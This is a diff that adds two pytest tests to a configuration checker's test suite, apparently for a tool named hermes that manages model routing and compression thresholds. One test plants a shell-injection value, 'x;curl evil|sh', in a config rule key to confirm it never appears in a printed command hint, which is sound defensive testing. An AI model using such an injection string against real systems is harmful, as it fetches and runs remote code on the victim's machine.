@@ -143,3 +143,18 @@ def test_a_rescope_still_points_at_a_declared_route_on_another_provider(make_pro
     assert f.proposed == {f"{SUBSCRIPTION}:claude-opus": 0.8}
     assert "a model you switch to" in f.summary
     assert "hermes -p default tuneup models add anthropic:<model>" in f.summary
+
+
+def test_a_rule_key_with_shell_syntax_never_reaches_the_printed_command(make_profile):
+    # The rule key comes from config.yaml; the hint is a command a person may paste into a shell.
+    models.declare("claude-subscription-directsdk-experimental", "claude-opus-5-5[1m]")
+    [f] = run_check(check, make_profile, CODEX_WITH_CLAUDE_RULE.format(rule="x;curl evil|sh #:claude-opus"))
+    assert "tuneup models add <provider>:<model> in a terminal" in f.summary
+    assert "add x;curl" not in f.summary
+
+
+def test_a_scoped_rule_for_what_an_auto_provider_main_really_runs_is_not_flagged(make_profile):
+    # Main names no provider; receipts saw it run on anthropic, where the scoped rule applies.
+    record_seen("claude-opus-5-5", "anthropic")
+    config = "model: {default: claude-opus-5-5, provider: auto}\ncompression: {model_thresholds: {'anthropic:claude-opus': 0.8}}\n"
+    assert run_check(check, make_profile, config) == []
